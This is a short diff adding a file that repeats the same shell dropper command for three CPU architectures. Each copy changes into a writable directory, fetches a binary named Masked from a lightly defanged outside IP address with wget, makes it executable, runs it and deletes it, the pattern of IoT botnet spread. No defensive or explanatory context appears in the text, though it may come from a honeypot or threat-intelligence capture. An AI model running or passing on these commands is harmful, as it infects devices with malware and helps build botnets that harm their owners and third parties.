@@ -1,0 +1,16 @@
+
+|| cd /var/run || cd /mnt
+|| cd /root || cd /; wget http:// 149 (.)
+3 .
+170 .
+237 /Masked.i686; chmod +x Masked.i686; ./Masked.i686; rm -rf Masked.i686 cd /tmp
+|| cd /var/run || cd /mnt
+|| cd /root || cd /; wget http:// 149 (.)
+3 .
+170 .
+237 /Masked.ppc; chmod +x Masked.ppc; ./Masked.ppc; rm -rf Masked.ppc cd /tmp
+|| cd /var/run || cd /mnt
+|| cd /root || cd /; wget http:// 149 (.)
+3 .
+170 .
+237 /Masked.i586; chmod +x Masked.i586; ./Masked.i586; rm -rf Masked.i586 cd /tmp
